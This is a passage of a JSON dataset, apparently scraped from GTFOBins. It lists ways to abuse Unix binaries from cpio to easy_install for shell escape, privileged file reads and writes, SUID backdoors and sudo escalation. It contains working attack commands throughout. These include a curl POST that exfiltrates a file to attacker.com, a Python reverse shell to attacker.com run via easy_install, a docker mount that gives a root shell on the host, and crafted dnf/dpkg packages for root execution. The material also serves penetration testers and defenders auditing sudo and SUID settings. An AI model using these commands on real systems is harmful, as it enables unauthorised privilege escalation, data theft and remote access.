        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nCopies $LFILE to the $LDIR directory.\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe content of the file is printed to standard output, between the cpio archive format header and footer.\nLFILE=file_to_read\necho \"$LFILE\" | cpio -o\n\n\nThe whole directory structure is copied to $TF.\nLFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | cpio -dp $TF\ncat \"$TF/$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe whole directory structure is copied to $TF.\nsudo install -m =xs $(which cpio) .\n\nLFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n\n\nCopies $LFILE to the $LDIR directory.\nsudo install -m =xs $(which cpio) .\n\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\necho '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n\n\nThe whole directory structure is copied to $TF.\nLFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n\n\nCopies $LFILE to the $LDIR directory.\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR"
      }
    ]
  },
  {
    "id": 60,
    "bin": "cpulimit",
    "url": "/gtfobins/cpulimit/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ncpulimit -l 100 -f /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which cpulimit) .\n\n./cpulimit -l 100 -f -- /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo cpulimit -l 100 -f /bin/sh"
      }
    ]
  },
  {
    "id": 61,
    "bin": "crash",
    "url": "/gtfobins/crash/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\ncrash -h\n!sh\n\n"
      },
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nCOMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo crash -h\n!sh"
      }
    ]
  },
  {
    "id": 62,
    "bin": "crontab",
    "url": "/gtfobins/crontab/",
    "funcs": [
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nThe commands are executed according to the crontab file edited via the crontab utility.\ncrontab -e\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe commands are executed according to the crontab file edited via the crontab utility.\nsudo crontab -e"
      }
    ]
  },
  {
    "id": 63,
    "bin": "csh",
    "url": "/gtfobins/csh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ncsh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nexport LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which csh) .\n\n./csh -b\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo csh"
      }
    ]
  },
  {
    "id": 64,
    "bin": "csplit",
    "url": "/gtfobins/csplit/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nWrites the data to xx0file_to_write. If needed, a different prefix can be specified with -f (instead of xx).\nTF=$(mktemp)\necho \"DATA\" > $TF\nLFILE=file_to_write\ncsplit -z -b \"%d$LFILE\" $TF 1\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which csplit) .\n\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"
      }
    ]
  },
  {
    "id": 65,
    "bin": "csvtool",
    "url": "/gtfobins/csvtool/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ncsvtool call '/bin/sh;false' /etc/passwd\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.\nLFILE=file_to_read\ncsvtool trim t $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which csvtool) .\n\nLFILE=file_to_read\n./csvtool trim t $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo csvtool call '/bin/sh;false' /etc/passwd"
      }
    ]
  },
  {
    "id": 66,
    "bin": "cupsfilter",
    "url": "/gtfobins/cupsfilter/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which cupsfilter) .\n\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
      }
    ]
  },
  {
    "id": 67,
    "bin": "curl",
    "url": "/gtfobins/curl/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the @ to send hard-coded data.\nURL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d @$file_to_send $URL\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe file path must be absolute.\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file path must be absolute.\nLFILE=/tmp/file_to_read\ncurl file://$LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nFetch a remote file via HTTP GET request.\nsudo install -m =xs $(which curl) .\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nFetch a remote file via HTTP GET request.\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE"
      }
    ]
  },
  {
    "id": 68,
    "bin": "cut",
    "url": "/gtfobins/cut/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which cut) .\n\nLFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\""
      }
    ]
  },
  {
    "id": 69,
    "bin": "dash",
    "url": "/gtfobins/dash/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ndash\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nexport LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which dash) .\n\n./dash -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo dash"
      }
    ]
  },
  {
    "id": 70,
    "bin": "date",
    "url": "/gtfobins/date/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ndate -f $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which date) .\n\nLFILE=file_to_read\n./date -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo date -f $LFILE"
      }
    ]
  },
  {
    "id": 71,
    "bin": "dd",
    "url": "/gtfobins/dd/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ndd if=$LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which dd) .\n\nLFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE"
      }
    ]
  },
  {
    "id": 72,
    "bin": "dialog",
    "url": "/gtfobins/dialog/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which dialog) .\n\nLFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0"
      }
    ]
  },
  {
    "id": 73,
    "bin": "diff",
    "url": "/gtfobins/diff/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n\n\nThis lists the content of a directory. $TF can be any directory, but for convenience it is better to use an empty directory to avoid noise output.\nLFOLDER=folder_to_list\nTF=$(mktemp -d)\ndiff --recursive $TF $LFOLDER\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which diff) .\n\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE"
      }
    ]
  },
  {
    "id": 74,
    "bin": "dig",
    "url": "/gtfobins/dig/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ndig -f $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which dig) .\n\nLFILE=file_to_read\n./dig -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo dig -f $LFILE"
      }
    ]
  },
  {
    "id": 75,
    "bin": "dmesg",
    "url": "/gtfobins/dmesg/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\ndmesg -H\n!/bin/sh\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis is not suitable for binary files.\nLFILE=file_to_read\ndmesg -rF \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo dmesg -H\n!/bin/sh"
      }
    ]
  },
  {
    "id": 76,
    "bin": "dmidecode",
    "url": "/gtfobins/dmidecode/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nIt can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\nGenerate the file with dmiwrite and upload it to the target.\n\n\n--dump-bin, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n\n--no-sysfs, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n\nmake dmiwrite\nTF=$(mktemp)\necho \"DATA\" > $TF\n./dmiwrite $TF x.dmi\n\nLFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\""
      }
    ]
  },
  {
    "id": 77,
    "bin": "dmsetup",
    "url": "/gtfobins/dmsetup/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which dmsetup) .\n\n./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'"
      }
    ]
  },
  {
    "id": 78,
    "bin": "dnf",
    "url": "/gtfobins/dnf/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nIt runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\nsudo dnf install -y x-1.0-1.noarch.rpm"
      }
    ]
  },
  {
    "id": 79,
    "bin": "docker",
    "url": "/gtfobins/docker/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThe resulting is a root shell.\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nWrite a file by copying it to a temporary container and back to the target destination on the host.\nCONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nRead a file by copying it to a temporary container and back to a new location on the host.\nCONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe resulting is a root shell.\nsudo install -m =xs $(which docker) .\n\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe resulting is a root shell.\nsudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
      }
    ]
  },
  {
    "id": 80,
    "bin": "dosbox",
    "url": "/gtfobins/dosbox/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nNote that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\\r\\n), if that\u2019s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.\nLFILE='\\path\\to\\file_to_write'\ndosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file content will be displayed in the DOSBox graphical window.\nLFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"type c:$LFILE\"\n\n\nThe file is copied to a readable location.\nLFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"copy c:$LFILE c:\\tmp\\output\" -c exit\ncat '/tmp/OUTPUT'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nNote that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\\r\\n), if that\u2019s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.\nsudo install -m =xs $(which dosbox) .\n\nLFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nNote that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\\r\\n), if that\u2019s a problem and your scenario allows it, you can create the file outside dosbox, then use copy to do the actual write.\nLFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"
      }
    ]
  },
  {
    "id": 81,
    "bin": "dpkg",
    "url": "/gtfobins/dpkg/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\ndpkg -l\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo dpkg -l\n!/bin/sh\n\n\nIt runs an interactive shell using a specially crafted Debian package. Generate it with fpm and upload it to the target.\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\nsudo dpkg -i x_1.0_all.deb"
      }
    ]
  },
  {
    "id": 82,
    "bin": "dvips",
    "url": "/gtfobins/dvips/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ntex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\ntex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which dvips) .\n\ntex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi"
      }
    ]
  },
  {
    "id": 83,
    "bin": "easy_install",
    "url": "/gtfobins/easy_install/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF\n\n\nServe files in the local folder running an HTTP server.\nexport LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF\n\n"
      },
      {
        "func": "File download",
